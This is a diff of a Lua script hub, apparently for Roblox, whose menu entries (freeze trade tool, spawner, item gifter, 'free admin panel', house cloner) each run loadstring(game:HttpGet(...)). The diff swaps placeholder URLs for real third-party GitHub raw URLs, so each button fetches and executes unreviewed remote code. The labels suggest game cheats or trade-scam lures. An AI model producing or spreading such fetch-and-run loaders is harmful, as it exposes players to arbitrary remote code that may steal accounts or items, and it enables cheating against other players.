@@ -145,7 +145,7 @@ local Scripts = {
             icon = "❄️",
             color = Color3.fromRGB(0, 207, 255),
             exec = function()
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/example/sab/freeze.lua"))()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/fvs-creator/freeze-trade-tool-sab/refs/heads/main/loader.lua"))()
             end
         },
         {
@@ -154,16 +154,16 @@ local Scripts = {
             icon = "🧠",
             color = Color3.fromRGB(168, 85, 247),
             exec = function()
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/example/sab/spawner.lua"))()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/fvs-creator/X-Ware-Hub/refs/heads/main/spawner.lua"))()
             end
         },
         {
             name = "A/P Gifter",
-            desc = "Auto-gift items to any player",
+            desc = "AP Gifter to any player",
             icon = "🎁",
             color = Color3.fromRGB(245, 158, 11),
             exec = function()
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/example/sab/gifter.lua"))()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/fvs-creator/FVS-sab/refs/heads/main/free%20admin%20panel.lua"))()
             end
         },
     },
@@ -174,7 +174,7 @@ local Scripts = {
             icon = "🏠",
             color = Color3.fromRGB(34, 197, 94),
             exec = function()
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/example/adm/housecloner.lua"))()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/fvshub/adm-house-cloner-/refs/heads/main/lua"))()
             end
         },
         {
